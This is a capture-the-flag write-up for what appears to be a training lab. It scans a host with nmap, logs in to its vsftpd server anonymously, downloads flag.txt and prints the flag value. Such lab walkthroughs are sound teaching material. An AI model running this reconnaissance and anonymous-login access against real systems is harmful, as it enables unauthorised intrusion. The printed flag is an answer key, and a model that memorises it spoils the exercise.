## 🔎 Solution
After a successful connection, I ran a port scan with `nmap`, added `-sV` to enumerate service versions:
```
> nmap -sV 10.129.34.18

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```
The scan shows port **21** running an FTP service (`vsftpd 3.0.3`) on a Unix host. 
**FTP** is a simple file-transfer protocol that often exposes directories and files; 
in CTFs it's common to find readable files or an *anonymous* login.

I connected to the FTP server with:
```
ftp <IP address>
```
The server responded with a `220` banner, indicating the service is ready. 
Many FTP servers allow an anonymous login - use `anonymous` as the username and  `anonymous@domain` as the password. 
```
> ftp 10.129.34.18
Connected to 10.129.34.18.
220 (vsFTPd 3.0.3)
Name (10.129.34.18:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```
After authenticating I received a `230` response meaning **Login successful**.

At the `ftp>` prompt I listed the directory:
```
ftp> ls
229 Entering Extended Passive Mode (|||58674|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

A `flag.txt` file was visible. I downloaded it with `get` command:
```
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||30118|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***************************************************************|    32      271.73 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.03 KiB/s)
```
Then I inspected the file locally to retrieve the flag, and obtained the flag.
```
> cat flag.txt 
035db21c881520061c53e0536e44f815
```
